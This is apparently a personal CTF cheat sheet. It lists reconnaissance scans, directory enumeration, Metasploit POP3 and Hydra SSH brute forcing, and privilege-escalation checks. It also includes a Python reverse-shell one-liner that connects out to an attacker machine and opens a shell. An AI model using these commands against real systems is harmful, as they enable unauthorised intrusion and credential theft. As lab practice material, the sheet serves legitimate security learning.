# Jeopardy-style CTFs

## Recon

### Port Scanning
- #### **nmap: For normal port scan**
```sh
nmap -sS -sV -O <ip> >> ports.txt
```
- **For aggressive port scan we will use**
```sh
nmap -A -p <ports that we found from normal scan> >> ports.txt
```
```sh
nmap -A -p- -Pn <ip> -v
```
- For scanning top 100 ports and slowing down the scan for hiding from attention 
```sh
nmap -A -F -T2 <ip> -v
```

### Directory Enumeration

- #### **Gobuster**
```sh
gobuster dir -u http://targetIp -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o directory.txt
```


### Some Important commands

- #### **Finding file Type**
```sh
file <filename>
```

- #### **Running Python Server**
```sh
python3 -m http.server 80
```

- #### **Basic Stegnography**
```sh
steghide extract -sf <PictureName>
```
- #### For seeing what is running on a file `we can check if there is any root process is running on a folder or not`
```sh
ps aux
```
- #### Finding belongings of `user` group
```ls
find / -group users -type f 2>/dev/null
```
- #### Finding a File
```sh
find / -type f -name user.txt 2> /dev/null
```

### FTP Commands
- #### Downloding from  `ftp` to `local`
```sh
mget <filename>
mget *
mget *.fileextention
```
- #### Alternative of `cat`
```sh
ftp> get file.txt -
```
- 

### POP3 Commands

#### Login BruteForce using `Metasploit`
- Password and Username list needed
```sh
msf6 > use auxiliary/scanner/po
use auxiliary/scanner/pop3/pop3_login 
msf6 > use auxiliary/scanner/pop3/pop3_login 
msf6 auxiliary(scanner/pop3/pop3_login) > set rhosts <Target_Ip>
rhosts => <Target_IP>
msf6 auxiliary(scanner/pop3/pop3_login) > set user_file username.txt
user_file => username.txt
msf6 auxiliary(scanner/pop3/pop3_login) > set pass_file password.txt
pass_file => password.txt
msf6 auxiliary(scanner/pop3/pop3_login) > set verbose false
verbose => false
msf6 auxiliary(scanner/pop3/pop3_login) > run

[+] 10.10.226.177:110     - 10.10.226.177:110 - Success: 'seina:scoobydoo2' '+OK Logged in.  '
```
- Need the Listener Now

```sh
nc <target_ip> 110
```
**Commands**
- To see list of files
```sh
list
```
- To see the files
```sh
retr <list number>
```

## Scripts

- #### Python Reverse shell `One-Liner`
```py
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<machine_Ip-openvpn>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
## PrivEsc

- #### **Finding info in the crontab**
```sh
cat /etc/crontab 
```

- #### Searching for `Bash History`
```sh
ls -la /etc/cron.daily/
```
## Reverse Shell
- Starting listener
```sh
nc -nlvp <port_number>
```
### PHP reverse-shell
```ls
/usr/share/webshell/
```
## Links 

- #### **Audio Decoder**
    - [Morsecode](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)

- #### **Password Decoder**
    - [Check Psychobreak](https://www.cachesleuth.com/vanity.html)

- #### Reverse Shell `These will give you ROOT` 
    - [GTFOBINS](https://gtfobins.github.io/)
    - [PentestMonkey](https://github.com/pentestmonkey)

- #### HashDecoder
    - [hash killer](https://hashkiller.io/listmanager)
- #### Vulnerability or CVE detection
    - [AttackerKB](https://attackerkb.com/)
    - [AttackerKB TOOL](https://github.com/horshark/akb-explorer)
    - TOOl SearchSploit

## Brute Forcing

- #### Hydra for SSH password bruteforce
```sh
hydra -l <ssh name> -P <passwordlist> -t 6 ssh://target
```


## TIPS
- **Try To know the Current Versions of SSH,UBUNTU,FTP etc**